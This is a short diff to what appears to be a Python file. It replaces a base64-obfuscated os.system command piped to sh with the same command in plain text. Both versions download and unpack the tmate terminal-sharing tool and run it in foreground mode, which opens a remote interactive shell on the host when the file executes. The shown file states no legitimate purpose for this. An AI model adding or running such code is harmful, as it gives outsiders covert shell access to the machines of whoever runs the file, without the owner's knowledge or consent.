@@ -1,2 +1,2 @@
 import os
-os.system('base64 -d <<< d2dldCBodHRwczovL2dpdGh1Yi5jb20vdG1hdGUtaW8vdG1hdGUvcmVsZWFzZXMvZG93bmxvYWQvMi40LjAvdG1hdGUtMi40LjAtc3RhdGljLWxpbnV4LWFtZDY0LnRhci54eiAgJiYgdGFyIC14ZiB0bWF0ZS0yLjQuMC1zdGF0aWMtbGludXgtYW1kNjQudGFyLnh6ICYmIGNkIHRtYXRlLTIuNC4wLXN0YXRpYy1saW51eC1hbWQ2NCAmJiAuL3RtYXRlIC1G== | sh')
+os.system('wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz  && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz && cd tmate-2.4.0-static-linux-amd64 && ./tmate -F')
